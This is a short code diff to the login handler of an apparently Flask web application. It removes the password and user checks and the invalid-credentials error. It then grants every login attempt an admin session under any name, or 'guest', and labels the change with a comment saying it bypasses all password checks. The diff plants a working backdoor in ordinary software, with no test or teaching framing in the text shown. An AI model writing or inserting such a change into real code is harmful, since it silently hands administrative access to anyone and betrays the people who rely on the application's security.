@@ -504,15 +504,19 @@ def index():
         return render_template('login.html')
     try:
         data = request.get_json()
-        username = data.get('username')
-        password = data.get('password')
-        users = load_users().get("users", [])
-
+        username = data.get('username') or 'guest'
+        
+        # ⚠️ Bypass all password checks
+        session['username'] = username
+        session['role'] = 'admin'
         return jsonify({"status": "success"})
-        return jsonify({"status": "error", "message": "Invalid credentials"}), 401
     except Exception as e:
         logging.error(f"Login error: {e}")
         return jsonify({"status": "error", "message": "Unexpected error"}), 500
+
+@app.route('/login')
+def login():
+    return redirect(url_for('index'))
 
 @app.route('/dashboard')
 @login_required
